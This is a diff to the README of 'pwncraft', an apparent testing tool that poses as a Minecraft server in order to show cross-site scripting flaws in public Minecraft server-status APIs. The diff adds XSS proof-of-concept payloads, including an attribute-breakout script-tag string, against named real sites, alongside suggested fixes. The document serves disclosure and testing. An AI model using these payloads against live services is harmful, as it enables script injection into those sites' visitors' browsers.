@@ -13,14 +13,16 @@ Fix: Accept only favicon that starts with `png,base64...`
 
 - `./pwncraft localhost 1337 -f 'https://CANARY/'`
 
+> XSS on https://api.serveurs-minecraft.com/
+
+- `https://api.serveurs-minecraft.com/api.php?Favicon_Ping&ip=YOUR_IP&port=YOUR_PORT`
+
+- `./pwncraft localhost 1337 -f '\"><script>alert(\"XSS\");</script><!--'`
+
 > XSS on https://minecraft-api.com
 
 Fix: HTML escape data from server
 
 - `https://minecraft-api.com/api/ping/YOUR_IP/YOUR_PORT`
 
-- `./pwncraft localhost 1337 -d '<script>alert("XSS !");</script>'`
-
-## Credits
-
-Varint implementation: https://github.com/jsvana/async-minecraft-ping/
+- `./pwncraft localhost 1337 -d '<script>alert(0);</script>'`
